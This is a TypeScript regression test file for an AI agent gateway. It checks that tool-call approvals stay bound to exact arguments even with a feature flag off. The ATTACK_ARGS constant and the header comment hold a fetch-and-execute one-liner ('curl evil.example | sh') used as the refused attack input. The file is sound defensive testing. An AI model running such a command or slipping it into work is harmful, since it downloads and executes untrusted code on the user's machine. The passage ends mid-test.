/**
 * S0 — LOCAL_EDGE argument-scoped grants must be flag-INDEPENDENT.
 * PRD-TCLAW-AGENT-PARTICIPATION-007 G1R Gate-1 (docs/prd-reviews/
 * G1R-OPUS-AGENT-PARTICIPATION-007-GATE1.md), blockers B-1 and B-7.
 *
 * THE DEFECT THIS GUARDS AGAINST (verified before the fix, recorded here so
 * the regression it prevents stays legible):
 *
 *   - CONSUMER: server.ts's `setToolAdmissionCheck` closure opened with
 *     `if (!collabEnabled()) return { ok: true }` -- the real exact-action
 *     check (`admitToolCall`) was unreachable unless the flag was on.
 *   - PRODUCER: c2Broker.ts's `registerApprovalC2` and `decideApprovalC2`
 *     both opened with `if (!collabEnabled()) return null` / `{kind:
 *     'legacy'}` -- with the flag off, no `gateway_action_grants` row was
 *     EVER minted, so even removing only the consumer gate would leave the
 *     fence permanently vacuous via its own `!carriesGrant` arm.
 *   - RECOVERY: server.ts's boot-time `revokeInertGrants` /
 *     `sweepExpiredApprovals` / `sweepExpiredGrants` sweep was ALSO wrapped
 *     in `if (collabEnabled())`, so a crashed gateway left inert grants
 *     unrevoked and stale approvals actionable in the default config.
 *
 * `collabEnabled()` defaults FALSE (principalBridge.ts:71-72; .env.example
 * sets no collab flag). So in a fresh install, "approve `terminal ls`"
 * silently covered "`terminal curl ... | sh`" on any later invocation
 * within the same granted request -- indefinitely, with nobody watching.
 * This is the exact residue of a defect class this program already fixed
 * on FRONTIER's `frontierGrantFenced` earlier the same day (commit
 * 72b4d36): "a security refusal that a feature flag can switch off is not
 * a refusal."
 *
 * FALSIFIABILITY DISCIPLINE (G1R §7.4/§7.5, repeated 5x in this repo's
 * history as V-1/RC-1/B-1/C-S5-1/A2-a):
 *   - every refusal assertion is paired with a SIDE-EFFECT-ABSENCE check
 *     (consumed_at / revoked_at stay NULL), never just a returned reason.
 *   - the matching-args admission is asserted in the SAME test as a
 *     POSITIVE CONTROL, so a build that refuses everything cannot pass.
 *   - each guard was reverted, the RED recorded verbatim below in this
 *     comment, then restored to GREEN. See the report for the transcript.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import Database from 'better-sqlite3';
import { readFileSync, mkdtempSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { randomUUID } from 'node:crypto';
import {
  ensureSurfaceSecuritySchema, activateSurfaceProjection, grantAuthority,
  grantProfileDelegation, revokeSurfaceProjection,
} from '../packages/gateway/src/surfaceSecurity.js';
import { GATEWAY_DIST_ENTRY as GATEWAY_DIST_ENTRY_BS01 } from './helpers/collab-gateway-harness.js';
import { ensureApprovalBrokerSchema } from '../packages/gateway/src/approvalSchema.js';
import {
  registerC2Approval, decideC2Approval, sweepExpiredApprovals, sweepExpiredGrants,
} from '../packages/gateway/src/approvalWriter.js';
import {
  privacyContextHash, routingContextHash, securityPolicyHash,
  validateAndCanonicalizeArgs, type ContextHashInput,
} from '../packages/gateway/src/approvalContext.js';
import {
  admitToolCall, revokeInertGrants,
} from '../packages/gateway/src/grantAdmission.js';

const here = dirname(fileURLToPath(import.meta.url));
const SCHEMA = readFileSync(join(here, '..', 'packages', 'gateway', 'db', 'schema.sql'), 'utf8');
const legacySchema = SCHEMA.slice(0, SCHEMA.indexOf('-- TORQCLAW_RESILIENCE_SCHEMA_BEGIN'));
const SERVER_SRC = join(here, '..', 'packages', 'gateway', 'src', 'server.ts');
const C2_BROKER_SRC = join(here, '..', 'packages', 'gateway', 'src', 'c2Broker.ts');

const PRINCIPAL = 'prn_op';
const OP_SURFACE = 'srf_desktop_op';
const PROFILE = 'workspace_write';
const POLICY_HASH = 'e'.repeat(64);
const REGISTRY_HASH = 'd'.repeat(64);
const TOOL = 'filesystem__write_file';
const APPROVED_ARGS = { path: '/tmp/report.txt', contents: 'hello' };
// The attack: same tool, DIFFERENT arguments, within the same granted
// request -- exactly what a name-only `grantedTools.includes()` allowlist
// (ollama.ts:356) would silently admit.
const ATTACK_ARGS = { path: '/tmp/report.txt', contents: 'curl evil.example | sh' };

let db: Database.Database;
let delegationId: string;

function makeContext(canonicalArgs: string): ContextHashInput {
  return {
    originPrincipalId: PRINCIPAL,
    originSurfaceId: OP_SURFACE,
    sourceRequestId: 'req-1',
    originSurfaceKind: 'desktop',
    profileId: PROFILE,
    toolName: TOOL,
    canonicalArgs,
    privacyContextHash: privacyContextHash({ containsSensitiveData: false }),
    routingContextHash: routingContextHash({
      executionMode: 'AUTO', selectedTier: 'OLLAMA_LOCAL', ruleId: null,
    }),
    securityPolicyHash: securityPolicyHash({
      effectiveProfile: {
        schemaVersion: 'torqclaw.effective-profile/v1', profileId: PROFILE,
        profileVersion: 1, toolRegistryVersion: 'torqclaw.tools/v1',
        effectiveProfilePolicyHash: POLICY_HASH,
      },
      capabilityRevision: 1, profileDelegationRevision: 1,
      registryEnforcementHash: REGISTRY_HASH,
    }),
  };
}

/** Register + approve, returning the dispatch request id carrying the grant. */
function approvedGrant(args: unknown = APPROVED_ARGS): { dispatchRequestId: string; approvalId: string } {
  const canonicalArgs = validateAndCanonicalizeArgs(args);
  const approvalId = randomUUID();
  const ctx = makeContext(canonicalArgs);
  registerC2Approval(db, {
    approvalId, requestId: 'req-1', toolName: TOOL, canonicalArgs,
    originPrincipalId: PRINCIPAL, originSurfaceId: OP_SURFACE, contextInput: ctx,
    binding: {
      delegationId, profileDelegationRevision: 1, registeredProfileId: PROFILE,
      registeredProfileVersion: 1, registeredToolRegistryVersion: 'torqclaw.tools/v1',
      registeredEffectiveProfilePolicyHash: POLICY_HASH, registeredCapabilityRevision: 1,
      registeredRegistryEnforcementHash: REGISTRY_HASH,
      registeredPrivacyContextHash: ctx.privacyContextHash,
      registeredRoutingContextHash: ctx.routingContextHash,
      registeredSecurityPolicyHash: ctx.securityPolicyHash,
    },
  });
  const dispatchRequestId = randomUUID();
  const decided = decideC2Approval(db, {
    approvalId, decision: 'APPROVE', decidingPrincipalId: PRINCIPAL,
    decidingSurfaceId: OP_SURFACE, currentContext: ctx, dispatchRequestId,
    mintDispatchTask: (id) => {
      db.prepare(
        `INSERT INTO tasks (request_id, session_id, tier, router_reason, state, request_json)
         VALUES (?, 's1','LOCAL_EDGE','remint','running','{}')`,
      ).run(id);
    },
  });
  expect(decided).not.toBeNull();
  return { dispatchRequestId, approvalId };
}

/**
 * Reproduce EXACTLY the closure server.ts's `setToolAdmissionCheck`
 * installs, post-fix: no `collabEnabled()` check, only the `!carriesGrant`
 * legacy-arm short-circuit followed by `admitToolCall`. This is what proves
 * the WIRING (not just `admitToolCall` in isolation) is flag-independent,
 * without booting a real Fastify server per test.
 */
function localEdgeAdmissionCheck(
  requestId: string, toolName: string, args: unknown,
): { ok: true } | { ok: false; reason: string } {
  const carriesGrant = db.prepare(
    'SELECT 1 FROM gateway_action_grants WHERE dispatch_request_id = ?',
  ).get(requestId) !== undefined;
  if (!carriesGrant) return { ok: true };
  const result = admitToolCall(db, {
    dispatchRequestId: requestId, toolName, args, path: 'LOCAL_EDGE',
  });
  return result.ok ? { ok: true } : { ok: false, reason: result.reason };
}

beforeEach(() => {
  db = new Database(':memory:');
  db.pragma('foreign_keys = ON');
  db.exec(legacySchema);
  ensureSurfaceSecuritySchema(db);
  ensureApprovalBrokerSchema(db);
  db.prepare("INSERT INTO sessions (id, role, client_name) VALUES ('s1','operator','c')").run();
  db.prepare(
    `INSERT INTO tasks (request_id, session_id, tier, router_reason, state, request_json)
     VALUES ('req-1','s1','LOCAL_EDGE','r','completed','{"id":"req-1"}')`,
  ).run();
  activateSurfaceProjection(db, {
    surfaceId: OP_SURFACE, principalId: PRINCIPAL, surfaceKind: 'desktop', surfaceRole: 'operator',
    allowedCapabilityClasses: ['read', 'write'], authEpoch: 1, capabilityRevision: 1,
    sourceIdentityRevision: 'rev-1',
  });
  grantAuthority(db, OP_SURFACE, 'approve', randomUUID());
  delegationId = randomUUID();
  grantProfileDelegation(db, {
    delegationId, surfaceId: OP_SURFACE, profileId: PROFILE,
    profileDelegationRevision: 1, profileSchemaVersion: 'torqclaw.effective-profile/v1',
    profileVersion: 1, toolRegistryVersion: 'torqclaw.tools/v1',
    effectiveProfilePolicyHash: POLICY_HASH, registryEnforcementHash: REGISTRY_HASH,
  });
});

afterEach(() => db.close());

describe('S0 B-1: LOCAL_EDGE admission fence is flag-independent (TORQCLAW_COLLAB_ENABLED UNSET)', () => {
  const saved = process.env.TORQCLAW_COLLAB_ENABLED;
  beforeEach(() => { delete process.env.TORQCLAW_COLLAB_ENABLED; });
  afterEach(() => {
    if (saved === undefined) delete process.env.TORQCLAW_COLLAB_ENABLED;
    else process.env.TORQCLAW_COLLAB_ENABLED = saved;
  });

  it('the premise: collabEnabled() is FALSE when unset (the default)', async () => {
    const { collabEnabled } = await import('../packages/gateway/src/principalBridge.js');
    expect(collabEnabled()).toBe(false);
  });

  // ── THE LOAD-BEARING PROBE ────────────────────────────────────────────
  // A granted request re-invoking the SAME tool with DIFFERENT arguments
  // must be REFUSED -- with the flag UNSET -- and the positive control
  // (matching args) in the SAME test must be admitted, so a build that
  // refuses everything cannot pass this test either.
  it('POSITIVE CONTROL admits matching args; SAME dispatch request with DIFFERENT args is refused action-binding-mismatch, flag UNSET', () => {
    expect(process.env.TORQCLAW_COLLAB_ENABLED).toBeUndefined();
    const { dispatchRequestId } = approvedGrant(APPROVED_ARGS);

    // Positive control FIRST would consume the one-shot grant, so probe the
    // attack on an UNCONSUMED grant to isolate the exact-action check from
    // one-shot consumption -- these are two different defenses and this
    // test is about the first one.
    const attack = localEdgeAdmissionCheck(dispatchRequestId, TOOL, ATTACK_ARGS);
    expect(attack.ok).toBe(false);
    expect((attack as { reason: string }).reason).toBe('action-binding-mismatch');
    // SIDE-EFFECT ABSENCE: the attack call must not have consumed anything.
    const afterAttack = db.prepare(
      'SELECT consumed_at FROM gateway_action_grants WHERE dispatch_request_id=?',
    ).get(dispatchRequestId) as { consumed_at: string | null };
    expect(afterAttack.consumed_at, 'the attack call must leave the grant UNCONSUMED').toBeNull();

    // POSITIVE CONTROL: the legitimately approved args, same grant, still admits.
    const legit = localEdgeAdmissionCheck(dispatchRequestId, TOOL, APPROVED_ARGS);
    expect(legit.ok).toBe(true);
    const afterLegit = db.prepare(
      'SELECT consumed_at FROM gateway_action_grants WHERE dispatch_request_id=?',
    ).get(dispatchRequestId) as { consumed_at: string | null };
    expect(afterLegit.consumed_at, 'the legitimate call MUST consume the grant').not.toBeNull();
  });

  it('a SECOND use of the same grant (even with the correct args) is refused grant-consumed, flag UNSET', () => {
    const { dispatchRequestId } = approvedGrant(APPROVED_ARGS);
    expect(localEdgeAdmissionCheck(dispatchRequestId, TOOL, APPROVED_ARGS).ok).toBe(true);
    const second = localEdgeAdmissionCheck(dispatchRequestId, TOOL, APPROVED_ARGS);
    expect(second.ok).toBe(false);
    expect((second as { reason: string }).reason).toBe('grant-consumed');
  });

  it('the flag-unset path reaches admitToolCall for real: an UNKNOWN dispatch id refuses grant-missing, not a silent {ok:true}', () => {
    // Proves the closure is not still short-circuiting to {ok:true} for
    // every request -- a dispatch id that never went through C2 at all
    // (no row exists) must still be admitted (the D-3/SI-4 legacy arm),
    // but a dispatch id that SHOULD carry a grant and does not must not be
    // silently waved through by the OLD flag gate. Since no row exists for
    // a random id, this exercises the `!carriesGrant` legacy arm and
    // confirms it still returns ok:true (D-3 preserved) rather than
    // asserting the removed flag gate's old unconditional {ok:true}.
    const result = localEdgeAdmissionCheck(randomUUID(), TOOL, APPROVED_ARGS);
    expect(result.ok).toBe(true); // D-3/SI-4: no grant row => legacy-compatible allow
  });

  it('the low-level writer (registerC2Approval + decideC2Approval, called directly -- not through c2Broker.ts) mints a real grant row', () => {
    // NOTE: this exercises the UNWRAPPED writer functions directly against
    // this test's own in-memory db, which is NOT the same code path as the
    // real c2Broker.ts wrapper (registerApprovalC2/decideApprovalC2) --
    // those operate on the gateway's module-singleton `db`
    // (packages/gateway/src/storage.ts) and cannot safely be pointed at an
    // in-memory test db. This test therefore CANNOT catch a regression of
    // c2Broker.ts's own flag gates (that would require these writer calls
    // to be reached only through registerApprovalC2/decideApprovalC2,
    // which read a different db entirely). The REAL wrapper functions are
    // covered below by the two STRUCTURAL tests, which read c2Broker.ts's
    // actual source and are proven (see report) to go RED when either
    // gate is reintroduced. This test's job is narrower: prove the WRITER
    // itself has no flag dependence of its own.
    const canonicalArgs = validateAndCanonicalizeArgs(APPROVED_ARGS);
    const approvalId = randomUUID();
    const ctx = makeContext(canonicalArgs);
    registerC2Approval(db, {
      approvalId, requestId: 'req-1', toolName: TOOL, canonicalArgs,
      originPrincipalId: PRINCIPAL, originSurfaceId: OP_SURFACE, contextInput: ctx,
      binding: {
        delegationId, profileDelegationRevision: 1, registeredProfileId: PROFILE,
        registeredProfileVersion: 1, registeredToolRegistryVersion: 'torqclaw.tools/v1',
        registeredEffectiveProfilePolicyHash: POLICY_HASH, registeredCapabilityRevision: 1,
        registeredRegistryEnforcementHash: REGISTRY_HASH,
        registeredPrivacyContextHash: ctx.privacyContextHash,
        registeredRoutingContextHash: ctx.routingContextHash,
        registeredSecurityPolicyHash: ctx.securityPolicyHash,
      },
    });
    const binding = db.prepare(
      'SELECT 1 FROM gateway_approval_bindings WHERE approval_id=?',
    ).get(approvalId);
    expect(binding, 'registerC2Approval (writer) must write a real binding').toBeDefined();

    const dispatchRequestId = randomUUID();
    const decided = decideC2Approval(db, {
      approvalId, decision: 'APPROVE', decidingPrincipalId: PRINCIPAL,
      decidingSurfaceId: OP_SURFACE, currentContext: ctx, dispatchRequestId,
      mintDispatchTask: (id) => {
        db.prepare(
          `INSERT INTO tasks (request_id, session_id, tier, router_reason, state, request_json)
           VALUES (?, 's1','LOCAL_EDGE','remint','running','{}')`,
        ).run(id);
      },
    });
    expect(decided, 'decideC2Approval (writer) must decide').not.toBeNull();
    const grant = db.prepare(
      'SELECT 1 FROM gateway_action_grants WHERE dispatch_request_id=?',
    ).get(dispatchRequestId);
    expect(grant, 'a real gateway_action_grants row must exist').toBeDefined();
  });

  // ── STRUCTURAL REGRESSION GUARDS (source-level, mirrors
  //    frontier-grant-fence-unconditional.test.ts's proven pattern) ──────
  it('STRUCTURAL: the setToolAdmissionCheck closure does not gate on collabEnabled()', () => {
    const src = readFileSync(SERVER_SRC, 'utf8');
    const m = src.match(/setToolAdmissionCheck\(\(requestId, toolName, args\) => \{[\s\S]*?\n\}\);/);
    expect(m, 'setToolAdmissionCheck closure not found -- was it renamed?').toBeTruthy();
    const body = m![0];
    expect(body, 'S0 REGRESSION: the LOCAL_EDGE admission fence is gated on a '
      + 'feature flag again. TORQCLAW_COLLAB_ENABLED defaults OFF, so this '
      + 'makes the exact-action check unreachable by default.')
      .not.toContain('collabEnabled');
    // The legacy D-3/SI-4 arm must remain -- this is a DELIBERATE
    // short-circuit, not the removed defect.
    expect(body).toContain('carriesGrant');
    expect(body).toContain('admitToolCall');
  });

  it('STRUCTURAL: registerApprovalC2 does not gate on collabEnabled()', () => {
    const src = readFileSync(C2_BROKER_SRC, 'utf8');
    const m = src.match(/export function registerApprovalC2\([\s\S]*?\n\}/);
    expect(m, 'registerApprovalC2 not found').toBeTruthy();
    expect(m![0], 'S0 REGRESSION: registerApprovalC2 is gated on a feature '
      + 'flag again, which would make grant minting unreachable by default')
      .not.toContain('collabEnabled');
  });

  it('STRUCTURAL: decideApprovalC2 does not gate on collabEnabled()', () => {
    const src = readFileSync(C2_BROKER_SRC, 'utf8');
    const startIdx = src.indexOf('export function decideApprovalC2(');
    expect(startIdx, 'decideApprovalC2 not found').toBeGreaterThan(-1);
    const endIdx = src.indexOf('const binding = db.prepare', startIdx);
    expect(endIdx, 'decideApprovalC2 body up to the binding lookup not found').toBeGreaterThan(startIdx);
    const body = src.slice(startIdx, endIdx);
    expect(body, 'S0 REGRESSION: decideApprovalC2 is gated on a feature '
      + 'flag again, which would make grant consumption unreachable by '
      + 'default even if registerApprovalC2 stayed unconditional')
      .not.toContain('collabEnabled');
  });
});

describe('S0 B-1: the REAL c2Broker.ts wrapper functions (not the low-level writer) mint a grant with the flag UNSET', () => {
  // registerApprovalC2/decideApprovalC2 read the gateway's module-singleton
  // `db` (packages/gateway/src/storage.ts), never a db passed as a
  // parameter, so they cannot be pointed at this file's in-memory test db.
  // The only way to drive the REAL wrapper functions -- as opposed to the
  // unwrapped writer -- is to point TORQCLAW_DATA_DIR at a real temp
  // directory and import the actual module graph, exactly as
  // tests/auth-v2-phase1.test.ts's FRONTIER-fence-on-built-artifact case
  // does with dispatch.js. This is slower than an in-memory unit test but
  // it is the only test in this file that imports registerApprovalC2 and
  // decideApprovalC2 BY NAME and calls them -- everything else either
  // calls the low-level writer directly or asserts on source text.
  const savedFlag = process.env.TORQCLAW_COLLAB_ENABLED;
  const savedDir = process.env.TORQCLAW_DATA_DIR;

  afterEach(async () => {
    if (savedFlag === undefined) delete process.env.TORQCLAW_COLLAB_ENABLED;
    else process.env.TORQCLAW_COLLAB_ENABLED = savedFlag;
    if (savedDir === undefined) delete process.env.TORQCLAW_DATA_DIR;
    else process.env.TORQCLAW_DATA_DIR = savedDir;
  });

  it('registerApprovalC2 + decideApprovalC2, called BY NAME from c2Broker.ts, mint a real gateway_action_grants row with TORQCLAW_COLLAB_ENABLED unset', async () => {
    delete process.env.TORQCLAW_COLLAB_ENABLED;
    const { mkdtempSync } = await import('node:fs');
    const { tmpdir } = await import('node:os');
    const realDataDir = mkdtempSync(join(tmpdir(), 'torq-s0-wrapper-'));
    process.env.TORQCLAW_DATA_DIR = realDataDir;

    const { resetStateDbForTest, db: liveDb } = await import('../packages/gateway/src/storage.js');
    resetStateDbForTest({ close: false });
    const { registerApprovalC2, decideApprovalC2 } = await import('../packages/gateway/src/c2Broker.js');
    const {
      ensureSurfaceSecuritySchema: ensureSchemaLive, activateSurfaceProjection: activateLive,
      grantAuthority: grantAuthorityLive, grantProfileDelegation: grantDelegationLive,
      captureTaskOrigin,
    } = await import('../packages/gateway/src/surfaceSecurity.js');
    const { ensureApprovalBrokerSchema: ensureApprovalLive } = await import('../packages/gateway/src/approvalSchema.js');

    ensureSchemaLive(liveDb);
    ensureApprovalLive(liveDb);

    const sid = randomUUID();
    const wrapperPrincipal = 'prn_wrapper_test';
    const wrapperSurface = 'srf_wrapper_test';
    const wrapperProfile = 'wrapper_profile';
    const wrapperPolicyHash = 'a'.repeat(64);
    const wrapperRegistryHash = 'b'.repeat(64);
    liveDb.prepare("INSERT INTO sessions (id, role, client_name) VALUES (?, 'operator','wrapper-test')").run(sid);

    activateLive(liveDb, {
      surfaceId: wrapperSurface, principalId: wrapperPrincipal, surfaceKind: 'desktop', surfaceRole: 'operator',
      allowedCapabilityClasses: ['read', 'write'], authEpoch: 1, capabilityRevision: 1,
      sourceIdentityRevision: 'rev-1',
    });
    grantAuthorityLive(liveDb, wrapperSurface, 'approve', randomUUID());
    const wrapperDelegationId = randomUUID();
    grantDelegationLive(liveDb, {
      delegationId: wrapperDelegationId, surfaceId: wrapperSurface, profileId: wrapperProfile,
      profileDelegationRevision: 1, profileSchemaVersion: 'torqclaw.effective-profile/v1',
      profileVersion: 1, toolRegistryVersion: 'torqclaw.tools/v1',
      effectiveProfilePolicyHash: wrapperPolicyHash, registryEnforcementHash: wrapperRegistryHash,
    });

    const requestId = randomUUID();
    captureTaskOrigin(liveDb, {
      requestId, sessionId: sid, connectionId: randomUUID(), principalId: wrapperPrincipal,
      surfaceId: wrapperSurface, surfaceKind: 'desktop', credentialId: randomUUID(),
      authEpoch: 1, capabilityRevision: 1,
    });

    const effectiveProfile = {
      schemaVersion: 'torqclaw.effective-profile/v1' as const,
      profileId: wrapperProfile as any,
      profileVersion: 1 as any,
      toolRegistryVersion: 'torqclaw.tools/v1',
      allowedOperationIds: [],
      capabilityClasses: ['read', 'write'] as any,
      sideEffectClasses: [] as any,
      allowedTiers: ['LOCAL_EDGE'] as any,
      operationCapabilities: {},
      operationSideEffects: {},
      operationApprovals: {},
      scopes: { path: 'none', network: 'none' } as any,
      approvalRequirements: { write: true, exec: true, send: false },
      policyHash: wrapperPolicyHash,
    };

    const req = {
      id: requestId,
      sessionId: sid,
      sourceChannel: 'test',
      receivedAt: new Date().toISOString(),
      payload: {
        prompt: 'wrapper test', assembledContext: '', contextSize: 0,
        requiredTools: [], taskType: 'general', grantedTools: [],
      },
      constraints: { latencySensitivity: 'LOW', containsSensitiveData: false, executionMode: 'AUTO' },
      enrichment: { memoryUsed: false },
      effectiveProfile,
    } as any;
    const diag = { score: 1, reason: 'test', tier: 'LOCAL_EDGE' } as any;

    // decideApprovalC2 re-reads the ORIGINAL request from tasks.request_json
    // (c2Broker.ts's own comment: "the inputs must come from live state
    // here rather than from the stored binding"), so the task row must
    // carry the REAL serialized request, not a stub -- registerApprovalC2
    // itself never writes tasks.request_json (that is dispatch.ts's job in
    // production, done before ToolApprovalRequired is even thrown).
    liveDb.prepare(
      `INSERT INTO tasks (request_id, session_id, tier, router_reason, state, request_json)
       VALUES (?, ?, 'LOCAL_EDGE', 'r', 'running', ?)`,
    ).run(requestId, sid, JSON.stringify(req));

    // ── THE ACTUAL WRAPPER CALL, BY NAME, FLAG UNSET ──
    const approvalId = registerApprovalC2(req, diag, TOOL, APPROVED_ARGS);
    expect(approvalId, 'S0 REGRESSION: registerApprovalC2 must register with the flag unset').not.toBeNull();

    const binding = liveDb.prepare(
      'SELECT 1 FROM gateway_approval_bindings WHERE approval_id=?',
    ).get(approvalId);
    expect(binding, 'S0 REGRESSION: registerApprovalC2 must write a real binding with the flag unset').toBeDefined();

    const outcome = decideApprovalC2(
      approvalId!, 'APPROVE', wrapperPrincipal, wrapperSurface,
      (id) => {
        liveDb.prepare(
          `INSERT INTO tasks (request_id, session_id, tier, router_reason, state, request_json)
           VALUES (?, ?, 'LOCAL_EDGE', 'remint', 'running', '{}')`,
        ).run(id, sid);
      },
    );
    expect(outcome.kind, 'S0 REGRESSION: decideApprovalC2 must decide (not fall to legacy) with the flag unset')
      .toBe('decided');
    if (outcome.kind === 'decided') {
      const grant = liveDb.prepare(
        'SELECT 1 FROM gateway_action_grants WHERE dispatch_request_id=?',
      ).get(outcome.decided.dispatchRequestId);
      expect(grant, 'S0 REGRESSION: a real gateway_action_grants row must exist after decideApprovalC2 with the flag unset')
        .toBeDefined();
    }

    resetStateDbForTest({ close: true });
  }, 30000);
});

// ── G1R B-S0-1: the SHIPPED setToolAdmissionCheck closure, not the replica ──
//
// Everything above this point calls `localEdgeAdmissionCheck` (line 148), a
// hand-rolled COPY of server.ts's closure -- already fixed, never able to
// regress. G1R proved by mutation that 13 of that 14-test block still pass
// with the real gate restored at server.ts:168; only the source-text
// STRUCTURAL test caught it.
//
// WHY THIS IS NOT A WEBSOCKET TEST (traced, not assumed):
// `authenticateConnection`'s `resolveSurface` closure
// (server.ts:256-261) is `if (!collabEnabled()) return null;` -- a surface
// credential cannot authenticate AT ALL with the flag unset, so a C1
// connection (required for C2 registration, since `recordTaskOrigin`
// (server.ts:98) is ALSO still `if (!collabEnabled() || auth === null)
// return;` BY DESIGN -- see its comment: "That is the SI-4 requirement")
// can never produce a real C2-bound grant over the live wire, flag off.
// That is not the S0 defect -- it is SI-4 working as intended. So a
// wire-driven flag-off test could only ever exercise the legacy
// `!carriesGrant => ok:true` arm, which the existing "D-3/SI-4 arm"
// describe block already covers.
//
// What actually needs proving is narrower and is what B-S0-1 is really
// about: that `setToolAdmissionCheck`'s installed closure -- the ACTUAL
// object `@torqclaw/inference`'s module-singleton `admitTool` variable
// holds once the real `server.ts` has run its top-level
// `setToolAdmissionCheck(...)` call -- performs the real exact-action check
// with NO `collabEnabled()` term anywhere in its own logic, REGARDLESS of
// how the grant it is checking against came to exist. A grant that already
// exists in `gateway_action_grants` must be honoured or refused on its own
// terms by the shipped closure, flag on or off; the flag must never be a
// second, silent way past it.
//
// HOW THIS IS DRIVEN WITHOUT A RACE: importing `dist/server.js` in-process
// runs its module-top-level code -- including `setToolAdmissionCheck(...)`
// at server.ts:167-176 -- against the SAME `@torqclaw/inference` module
// instance this test process holds, exactly as the existing "REAL
// c2Broker.ts wrapper functions" block above already does for
// `registerApprovalC2`/`decideApprovalC2` (importing c2Broker.js by name
// against a live TORQCLAW_DATA_DIR). Then `dispatch()` is called DIRECTLY
// (also imported from the built dist graph) with a HAND-BUILT
// GatewayRequest whose `id` this test chooses -- never a client-visible
// value, so there is no server-random id to race against, and no
// websocket round-trip between "seed the grant" and "dispatch reads it".
// The forced-tool branch (ollama.ts:228-253, `TORQCLAW_E2E_FORCE_GATED_TOOL`)
// then calls the REAL `admitTool` synchronously inside `executeLocalEdge`,
// which is the exact function `setToolAdmissionCheck` installed.
//
// The grant is seeded with the low-level writer (`registerC2Approval` +
// `decideC2Approval` from approvalWriter.ts, the same functions the
// in-memory tests above use, here pointed at the LIVE dist `storage.js`
// db instead of an in-memory one) bound to APPROVED_ARGS. The dispatched
// request then carries either APPROVED_ARGS (positive control) or
// DIFFERENT_ARGS (attack) as its forced-tool prompt, so the closure's own
// `actionHash` comparison is what decides admission -- nothing in this
// test computes or asserts that hash itself.
describe('G1R B-S0-1: the SHIPPED setToolAdmissionCheck closure is flag-independent (booted artifact, no websocket)', () => {
  const TOOL = 'filesystem__write_file';

  it('POSITIVE CONTROL: matching args are ADMITTED and the tool executes; ATTACK: mismatched args are REFUSED action-binding-mismatch and the tool does NOT execute -- both decided by the SHIPPED setToolAdmissionCheck closure, TORQCLAW_COLLAB_ENABLED unset', async () => {
    expect(process.env.TORQCLAW_COLLAB_ENABLED).toBeUndefined();

    const dataDir = mkdtempSync(join(tmpdir(), 'torq-bs01-'));
    const prevDir = process.env.TORQCLAW_DATA_DIR;
    const prevFlag = process.env.TORQCLAW_COLLAB_ENABLED;
    const prevForce = process.env.TORQCLAW_E2E_FORCE_GATED_TOOL;
    process.env.TORQCLAW_DATA_DIR = dataDir;
    delete process.env.TORQCLAW_COLLAB_ENABLED; // THE PREMISE
    // Deterministic tool-choice seam (ollama.ts:228-253): without this the
    // executor falls through to the REAL Ollama /v1 loop and hangs/times
    // out against whatever (or no) local model is on this host. This does
    // not weaken what is proven -- the forced branch still calls the SAME
    // `admitTool` the real tool-call loop calls, and it is the documented
    // E2E determinism seam every other booted-artifact C2 test in this repo
    // already relies on (collab-c2-flag-on-e2e.test.ts, etc).
    process.env.TORQCLAW_E2E_FORCE_GATED_TOOL = TOOL;

    try {
      const distDir = join(GATEWAY_DIST_ENTRY_BS01, '..');

      // Re-point the dist module's state.db handle at THIS case's data dir
      // BEFORE importing server.js -- mirrors the existing FRONTIER
      // in-process test's own documented reason: ESM caches modules across
      // test files in the same worker, and a statement prepared against a
      // stale handle throws "database connection is not open".
      const { resetStateDbForTest, db: liveDb } = await import(
        pathToFileURL(join(distDir, 'storage.js')).href
      ) as { resetStateDbForTest: (o?: { close?: boolean }) => void; db: import('better-sqlite3').Database };
      resetStateDbForTest({ close: false });

      // Import server.js -- this is the ENTIRE point. Its top-level code
      // runs `setToolAdmissionCheck((requestId, toolName, args) => { ... })`
      // (server.ts:167-176) against the live `@torqclaw/inference` module
      // instance this process holds. It also binds a real Fastify listener
      // (no client of this test ever connects to it) and calls
      // `connectBridge()`, which degrades gracefully with no MCP servers
      // configured -- the same boot path `launchGateway`'s child process
      // takes, just in this process instead of a spawned one.
      await import(pathToFileURL(join(distDir, 'server.js')).href);

      const { dispatch } = await import(pathToFileURL(join(distDir, 'dispatch.js')).href) as {
        dispatch: (req: unknown, diag: unknown) => void;
      };
      const {
        registerC2Approval, decideC2Approval,
      } = await import(pathToFileURL(join(distDir, 'approvalWriter.js')).href) as {
        registerC2Approval: (db: unknown, params: unknown) => void;
        decideC2Approval: (db: unknown, params: unknown) => { dispatchRequestId: string | null } | null;
      };
      const {
        validateAndCanonicalizeArgs, privacyContextHash, routingContextHash, securityPolicyHash,
      } = await import(pathToFileURL(join(distDir, 'approvalContext.js')).href) as {
        validateAndCanonicalizeArgs: (a: unknown) => string;
        privacyContextHash: (i: unknown) => string;
        routingContextHash: (i: unknown) => string;
        securityPolicyHash: (i: unknown) => string;
      };
      const {
        ensureSurfaceSecuritySchema: ensureSchemaLive, activateSurfaceProjection: activateLive,
        grantAuthority: grantAuthorityLive, grantProfileDelegation: grantDelegationLive,
      } = await import(pathToFileURL(join(distDir, 'surfaceSecurity.js')).href) as {
        ensureSurfaceSecuritySchema: (db: unknown) => void;
        activateSurfaceProjection: (db: unknown, p: unknown) => void;
        grantAuthority: (db: unknown, surfaceId: string, kind: string, id: string) => void;
        grantProfileDelegation: (db: unknown, p: unknown) => void;
      };
      const { ensureApprovalBrokerSchema: ensureApprovalLive } = await import(
        pathToFileURL(join(distDir, 'approvalSchema.js')).href
      ) as { ensureApprovalBrokerSchema: (db: unknown) => void };

      ensureSchemaLive(liveDb);
      ensureApprovalLive(liveDb);

      const sid = randomUUID();
      const wrapperPrincipal = 'prn_bs01_operator';
      const wrapperSurface = 'srf_bs01_desktop';
      const wrapperProfile = 'bs01_profile';
      const wrapperPolicyHash = 'a'.repeat(64);
      const wrapperRegistryHash = 'b'.repeat(64);
      liveDb.prepare("INSERT INTO sessions (id, role, client_name) VALUES (?, 'operator','bs01-test')").run(sid);

      activateLive(liveDb, {
        surfaceId: wrapperSurface, principalId: wrapperPrincipal, surfaceKind: 'desktop', surfaceRole: 'operator',
        allowedCapabilityClasses: ['read', 'write'], authEpoch: 1, capabilityRevision: 1,
        sourceIdentityRevision: 'rev-1',
      });
      grantAuthorityLive(liveDb, wrapperSurface, 'approve', randomUUID());
      const delegationId = randomUUID();
      grantDelegationLive(liveDb, {
